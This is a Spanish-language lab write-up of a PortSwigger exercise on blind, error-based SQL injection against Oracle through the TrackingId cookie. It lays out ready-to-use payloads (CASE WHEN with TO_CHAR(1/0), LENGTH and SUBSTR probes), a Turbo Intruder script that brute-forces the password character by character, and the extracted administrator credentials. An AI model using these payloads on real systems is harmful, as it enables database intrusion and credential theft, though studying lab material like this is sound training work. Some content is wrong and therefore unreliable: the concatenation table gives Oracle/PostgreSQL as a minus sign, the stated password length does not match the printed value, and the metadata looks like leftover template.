---
title: "Inyección SQL ciega con errores condicionales"
platform: "PortSwigger"
os: "Windows"
difficulty: "Hard"
ip: "10.10.10.XXX"
slug: "inyeccion-sql-ciega-con-errores-condicionales"
author: "Z4k7"
date: "2026-03-27"
year: "2026"
status: "pwned"
tags:
  - "sqli"
  - "web"
  - "blind"
  - "error"
  - "oracle"
  - "practitioner"
techniques:
  - "Blind SQL Injection"
  - "error-based"
  - "CASE WHEN"
  - "TO_CHAR(1/0)"
  - "Oracle"
  - "cookie injection"
  - "SUBSTR"
  - "LENGTH"
tools:
  - "BurpSuite"
  - "Turbo Intruder"
  - "Python"
flags_list:
  - label: "administrador"
    value: "administrator"
  - label: "password"
    value: "0ripns1j93ikxdgg23m"
summary: "La Blind SQLi basada en errores condicionales explota la cookie TrackingId concatenada sin sanitización en Oracle. No hay output visible ni diferencia de comportamiento — el canal es el status HTTP (200 vs 500). La query fuerza un error de división por cero cuando la condición es TRUE. Cadena de ataque: fingerprint Oracle (FROM dual) → CASE WHEN (cond) THEN TO_CHAR(1/0) → confirmar tabla/usuario → LENGTH(password) = 20 → SUBSTR carácter a carácter via Turbo Intruder → password completo → login.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Se identifica la cookie `TrackingId` via BurpSuite:
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20errores%20condicionales/file-20260312112204224.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Confirmación de vulnerabilidad mediante diferencia de status HTTP:
      - kind: "code"
        lang: "SQL"
        code: |
          Cookie: TrackingId=aPeeitcEWYPNM70M'--  → HTTP 200 (sintaxis válida)
          Cookie: TrackingId=aPeeitcEWYPNM70M'    → HTTP 500 (error de sintaxis)
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El vector es la cookie `TrackingId` — no un parámetro GET/POST visible. En auditorías siempre revisa headers y cookies. El canal de datos aquí es el status HTTP: 200 = condición válida/FALSE, 500 = error/TRUE. Eso es suficiente para extraer datos bit a bit."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Fingerprint Oracle mediante concatenación:
      - kind: "code"
        lang: "SQL"
        code: |
          '||(SELECT '')||'             → HTTP 500 (falla sin FROM — confirma Oracle)
          '||(SELECT '' FROM dual)||'   → HTTP 200 ✓ (Oracle confirmado)
      - kind: "bullet"
        text: "Motor: Oracle (confirmado por necesidad de FROM dual)"
      - kind: "bullet"
        text: "Canal: status HTTP (200 = OK/FALSE, 500 = error/TRUE)"
      - kind: "bullet"
        text: "Vector: cookie TrackingId"
      - kind: "bullet"
        text: "Tabla objetivo: users con columnas username, password"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "La técnica de concatenación `'||payload||'` inyecta dentro del valor de la cookie sin romper la sintaxis. El `||` es el operador de concatenación de Oracle. La necesidad de `FROM dual` confirma definitivamente Oracle — sin eso, cualquier SELECT falla en Oracle."

  - id: "step3"
    num: "03"
    title: "Paso 1 — Estructura base del error condicional"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          SELECT CASE WHEN (condición) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
      - kind: "bullet"
        text: "Condición TRUE → TO_CHAR(1/0) → división por cero → HTTP 500"
      - kind: "bullet"
        text: "Condición FALSE → NULL → sin error → HTTP 200"
      - kind: "note"
        text: |
          Validación:
      - kind: "code"
        lang: "SQL"
        code: |
          -- TRUE → HTTP 500
          Cookie: TrackingId=aPeeitcEWYPNM70M'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
          
          -- FALSE → HTTP 200
          Cookie: TrackingId=aPeeitcEWYPNM70M'||(SELECT CASE WHEN (2=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

  - id: "root"
    num: "04"
    title: "Paso 2 — Confirmar tabla users y usuario administrator"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
      - kind: "note"
        text: |
          → HTTP 500 = tabla `users` existe Y usuario `administrator` existe ✓
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este paso es crítico antes de extraer el password — confirmas que el objetivo existe. Si recibes HTTP 200 aquí, el usuario no existe en esa tabla o el nombre de la tabla es diferente."

  - id: "step5"
    num: "05"
    title: "Paso 3 — Determinar longitud del password"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          Cookie: TrackingId=yMeKzH5d1nzfJ0Ut'||(SELECT CASE WHEN LENGTH(password)>N THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
      - kind: "note"
        text: |
          Enviado via Intruder incrementando N:
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20errores%20condicionales/file-20260312120800365.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Resultado: 20 caracteres en el password.
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20errores%20condicionales/file-20260312121149695.jpg"
        caption: "Evidencia técnica"

  - id: "step6_1"
    num: "06"
    title: "Paso 4 — Extraer password carácter a carácter"
    content:
      - kind: "note"
        text: |
          Payload base:
      - kind: "code"
        lang: "SQL"
        code: |
          '||(SELECT CASE WHEN SUBSTR(password,§pos§,1)='§char§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
      - kind: "note"
        text: |
          Script Turbo Intruder:
      - kind: "code"
        lang: "PYTHON"
        code: |
          def queueRequests(target, wordlists):
              engine = RequestEngine(endpoint=target.endpoint,
                                     concurrentConnections=2,
                                     requestsPerConnection=20,
                                     pipeline=False)
          
              for numero in range(1, 25):
                  with open('C:\\Users\\Public\\abc.txt') as f:
                      for word in f:
                          word = word.rstrip()
                          engine.queue(target.req, [str(numero), word])
          
          def handleResponse(req, interesting):
              if req.status != 200:
                  table.add(req)
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "La lógica del script: cuando el carácter en la posición N coincide → CASE genera división por cero → HTTP 500. El script captura todos los requests que NO sean 200 — esos son los hits. La diferencia con el lab de respuestas condicionales: aquí detectamos por status HTTP, allá por contenido HTML. Turbo Intruder es necesario porque Intruder Community es demasiado lento para 24 posiciones × ~36 caracteres."
      - kind: "note"
        text: |
          Resultado de extracción:
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20errores%20condicionales/file-20260312130320941.jpg"
        caption: "Evidencia técnica"

  - id: "exploit"
    num: "07"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Credenciales extraídas via Blind SQLi error-based Oracle. Login exitoso como administrator.
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20errores%20condicionales/file-20260312132254499.jpg"
        caption: "Evidencia técnica"

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "administrador"
        value: "administrator"
      - label: "password"
        value: "0ripns1j93ikxdgg23m"

  - id: "privesc_1"
    num: "08"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          No aplica — el acceso obtenido ya es el de administrador.

  - id: "step9_1"
    num: "09"
    title: "Información — Concatenación por motor de BD"
    content:
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20errores%20condicionales/file-20260312134945490.jpg"
        caption: "Evidencia técnica"
      - kind: "table"
        headers:
          - "Motor"
          - "Concatenación"
        rows:
          - ["Oracle / PostgreSQL", "`'foo'-'bar'`"]
          - ["Microsoft", "`'foo'+'bar'`"]
          - ["MySQL", "`CONCAT('foo','bar')`"]

lessons:
  - 'La Blind SQLi requiere paciencia y automatización — Turbo Intruder es clave.'
  - 'Siempre validar existencia de tabla y usuario antes de extraer datos.'
  - 'Diferencia clave: SQLi clásica (errores visibles) vs Blind (inferencia por status HTTP).'
  - 'En Oracle, `TO_CHAR(1/0)` fuerza el error condicional — en otros motores puede ser `1/0` directamente.'
mitigation:
  - 'Implementar consultas parametrizadas (Prepared Statements).'
  - 'Evitar concatenación de valores de cookies en SQL.'
  - 'Monitorear patrones de requests repetitivos (detección de brute-force).'
  - 'Configurar WAF para bloquear payloads comunes de SQLi.'
  - 'Revisar logs de aplicación para detectar anomalías en cookies.'
---
